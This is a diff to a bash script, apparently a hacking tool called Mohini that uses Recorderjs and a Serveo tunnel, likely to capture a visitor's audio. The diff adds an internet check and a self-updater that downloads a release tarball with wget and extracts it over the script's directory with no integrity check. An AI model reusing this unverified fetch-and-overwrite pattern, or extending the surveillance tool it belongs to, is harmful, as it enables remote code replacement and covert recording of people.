@@ -4,7 +4,7 @@
 # Using Recorderjs by: https://github.com/mattdiamond/Recorderjs
 
 
-__version__="1.1"
+__version__="1.2"
 
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
@@ -13,8 +13,18 @@ REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf
 MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
 RESETBG="$(printf '\e[0m\n')"
 
+## Directories
+BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
 
 trap 'printf "\n"; stop' 2
+
+## Reset terminal colors
+reset_color() {
+	tput sgr0   # reset attributes
+	tput op     # reset color
+	return
+}
+
 clear
 banner() {
     echo -e ${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -99,6 +109,56 @@ checkfound() {
   done
 }
 
+# Check for a newer release
+check_update(){
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
+	relase_url='https://api.github.com/repos/LxaNce-Hacker/Mohini/releases/latest'
+	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
+	tarball_url="https://github.com/LxaNce-Hacker/Mohini/archive/refs/tags/${new_version}.tar.gz"
+
+	if [[ $new_version != $__version__ ]]; then
+		echo -ne "${ORANGE}update found\n"${WHITE}
+		sleep 2
+		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
+		pushd "$HOME" > /dev/null 2>&1
+		wget "${tarball_url}" -O ".Mohini.tar.gz" 2>/dev/null
+
+		if [[ -e ".Mohini.tar.gz" ]]; then
+			tar -xf .Mohini.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
+			rm -f .Mohini.tar.gz
+			popd > /dev/null 2>&1
+			{ sleep 3; clear; banner; }
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run Mohini again\n\n"${WHITE}
+			{ reset_color ; exit 1; }
+		else
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
+			{ reset_color; exit 1; }
+		fi
+	else
+		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
+	fi
+}
+
+## Check Internet Status
+check_status() {
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
+	timeout 3s curl -fIs "https://api.github.com" > /dev/null
+	if [ $? -ne 0 ]; then
+		echo -e "${RED}Offline${WHITE}\n"
+		read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want To Continue Without Internet ${GREEN}[${CYAN}Y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
+		if [[ ${P_ANS} =~ ^([yY])$ ]]; then
+			echo -e "\n"
+		else
+			echo -ne "\n\n${RED}[${WHITE}👋${RED}]${BLUE} Bye !!! ${WHITE}\n"
+			exit 1
+		fi
+	else
+		echo -e "${GREEN}Online${WHITE}"
+		check_update
+	fi
+}
+
 server() {
   command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
   echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Starting Serveo..."
@@ -180,6 +240,7 @@ start() {
   checkfound
 }
 
+check_status
 banner
 dependencies
 start1
